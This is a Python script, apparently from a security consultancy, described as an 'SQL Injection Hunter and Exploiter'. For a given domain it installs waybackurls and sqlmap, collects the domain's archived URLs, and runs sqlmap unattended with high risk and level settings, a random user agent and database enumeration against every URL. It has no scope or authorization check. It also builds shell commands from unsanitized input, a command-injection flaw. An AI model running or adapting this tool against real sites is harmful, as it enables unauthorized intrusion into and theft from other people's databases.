#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: David Espejo (Fortytwo Security)

import argparse
import subprocess
import os
import platform
import sys

# Global debug flag
DEBUG = False

def run_command(command):
    if DEBUG:
        print(f"[DEBUG] Executing: {command}")
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    if DEBUG:
        print(f"[DEBUG] Output:\n{stdout.decode()}")
        print(f"[DEBUG] Errors:\n{stderr.decode()}")
    return stdout.decode(), stderr.decode()

def check_and_install_tools():
    tools = {
        "waybackurls": {"check": "which waybackurls", "install": install_waybackurls},
        "sqlmap": {"check": "which sqlmap", "install": install_sqlmap},
    }
    for tool, actions in tools.items():
        stdout, stderr = run_command(actions["check"])
        if not stdout.strip():
            print(f"[!] {tool} not found. Installing...")
            actions["install"]()

def install_waybackurls():
    if platform.system() == "Linux" or platform.system() == "Darwin":
        run_command("go install github.com/tomnomnom/waybackurls@latest")
        go_path = os.getenv("GOPATH", os.path.expanduser("~/go"))
        os.environ["PATH"] += os.pathsep + os.path.join(go_path, "bin")
    else:
        print(f"[!] Installation of waybackurls is not supported on this OS. Please install manually.")

def install_sqlmap():
    if platform.system() == "Linux":
        run_command("sudo apt update && sudo apt install sqlmap -y")
    elif platform.system() == "Darwin":
        run_command("brew install sqlmap")
    elif platform.system() == "Windows":
        print("[!] Please download and install SQLMap from https://sqlmap.org/ manually.")
    else:
        print(f"[!] Installation of SQLMap is not supported on this OS. Please install manually.")

def fetch_urls_from_archive(domain, output_file):
    print(f"[+] Fetching URLs from archive.org for {domain}...")
    waybackurls_command = f"waybackurls {domain} > {output_file}"
    stdout, stderr = run_command(waybackurls_command)
    if stderr:
        print("Errors fetching URLs from archive.org:")
        print(stderr)
    else:
        print(f"[+] URLs saved to {output_file}")

def main():
    global DEBUG

    parser = argparse.ArgumentParser(description="SQL Injection Hunter and Exploiter")
    parser.add_argument("-t", "--target", required=True, help="Target domain or IP address")
    parser.add_argument("-o", "--output", required=True, help="Output file name")
    parser.add_argument("-D", "--debug", action="store_true", help="Enable debug mode to show detailed output")
    args = parser.parse_args()

    domain = args.target
    output_file = args.output
    DEBUG = args.debug

    if DEBUG:
        print("[DEBUG] Debug mode enabled")

    # Step 1: Check and install necessary tools
    check_and_install_tools()

    # Step 2: Fetch URLs from archive.org
    sqliurls_file = "sqliurls.txt"
    fetch_urls_from_archive(domain, sqliurls_file)

    # Check if the sqliurls.txt file was created and has content
    if not os.path.exists(sqliurls_file) or os.path.getsize(sqliurls_file) == 0:
        print("Error: sqliurls.txt not found or empty. Check if URLs were fetched correctly.")
        return

    # Step 3: Run sqlmap
    print("[+] Running sqlmap on discovered URLs...")
    sqlmap_command = f"sqlmap -m {sqliurls_file} --batch --dbs --risk 2 --level 5 --random-agent | tee -a {output_file}"
    stdout, stderr = run_command(sqlmap_command)

    # Print sqlmap output
    print(stdout)
    if stderr:
        print("Errors during SQLMap execution:")
        print(stderr)

    print(f"[+] Results saved to {output_file}")

    # Clean up temporary file
    if os.path.exists(sqliurls_file):
        os.remove(sqliurls_file)

if __name__ == "__main__":
    main()
